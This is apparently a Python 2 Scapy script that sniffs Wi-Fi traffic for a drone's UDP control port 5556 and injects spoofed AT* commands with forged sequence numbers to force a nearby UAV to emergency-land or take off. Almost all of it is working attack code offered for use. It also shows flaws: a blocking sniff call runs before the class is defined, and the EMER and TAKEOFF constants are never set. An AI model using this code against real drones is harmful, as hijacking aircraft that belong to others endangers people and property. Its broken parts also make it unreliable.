from scapy.all import *
import threading
import dup




NAVPORT = 5556



def printPkt(pkt):
  if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == NAVPORT:
    raw = pkt.sprintf('%Raw.load%')
    print raw
conf.iface = 'wlan0mon'
sniff(prn=printPkt)

class interceptThread(threading.Thread):

	def __init__ (self):
		threading.Thread.__init__ (self)
		self.curPkt = None
		self.seq = 0
		self.foundUAV = False
	
	def run(self):
		sniff(prn=self.interceptPkt, filter='udp port 5556')
	
	def interceptPkt(self, pkt):

		if self.foundUAV == False:
			print '[*] UAV Found.'
			self.foundUAV = True
		self.curPkt = pkt
		raw = pkt.sprintf('%Raw.load%')
		try:
			self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
		except:
			self.seq = 0

	def injectCmd(self, cmd):
		radio = dup.dupRadio(self.curPkt)
		dot11 = dup.dupDot11(self.curPkt)
		snap = dup.dupSNAP(self.curPkt)
		llc = dup.dupLLC(self.curPkt)
		ip = dup.dupIP(self.curPkt)
		udp = dup.dupUDP(self.curPkt)
		raw = Raw(load=cmd)
		injectPkt = radio / dot11 / llc / snap / ip / udp / raw
		sendp(injectPkt)

	def emergencyland(self):
		spoofSeq = self.seq + 100
		watch = 'AT*COMWDG=%i\r'%spoofSeq
		toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, EMER)
		self.injectCmd(watch)
		self.injectCmd(toCmd)

	def takeoff(self):
		spoofSeq = self.seq + 100
		watch = 'AT*COMWDG=%i\r'%spoofSeq
		toCmd = 'AT*REF=%i,%s\r'% (spoofSeq + 1, TAKEOFF)
		self.injectCmd(watch)
		self.injectCmd(toCmd)




def main():
	uavIntercept = interceptThread()
	uavIntercept.start()
	print '[*] Listening for UAV Traffic. Please WAIT...'
	while uavIntercept.foundUAV == False:
			pass
	while True:
			tmp = raw_input('[-] Press ENTER to Emergency Land UAV.')
			uavIntercept.emergencyland()

if __name__ == '__main__':
   main()